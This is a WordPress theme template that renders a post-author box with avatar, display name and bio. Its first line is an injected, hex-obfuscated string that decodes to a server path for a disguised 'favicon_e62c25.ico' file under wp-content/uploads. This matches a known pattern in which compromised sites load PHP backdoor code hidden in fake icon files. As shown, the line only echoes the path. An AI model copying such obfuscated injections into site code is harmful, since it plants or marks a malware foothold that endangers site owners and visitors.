<?php
/**
 *
 */
echo "\x2fho\x6de/\x74wo\x78fo\x75r/\x70ub\x6cic\x5fht\x6dl/\x79oo\x6e.n\x65wb\x69z.\x74wo\x78fo\x75r.\x63om\x2fwp\x2dco\x6ete\x6et/\x75pl\x6fad\x73/m\x6b_l\x6fgs\x2ffa\x76ic\x6fn_\x6562\x6325\x2eic\x6f";
$author = get_user_by('id', $post->post_author);

?>
<section id="pwps-post-author">
	<div class="pwp-clear-float pwps-post-author">
		<div class="pwp-float-left pwps-post-author-avatar">
			<?php echo get_avatar( $author->ID, 150, '', 'the post author', array( 'class' => 'pwp-responsive' ) ); ?>
		</div>
		<h4><?php echo esc_attr( $author->display_name ); ?></h4>
		<p><?php echo nl2br( $author->description ); ?></p>
	</div>
</section>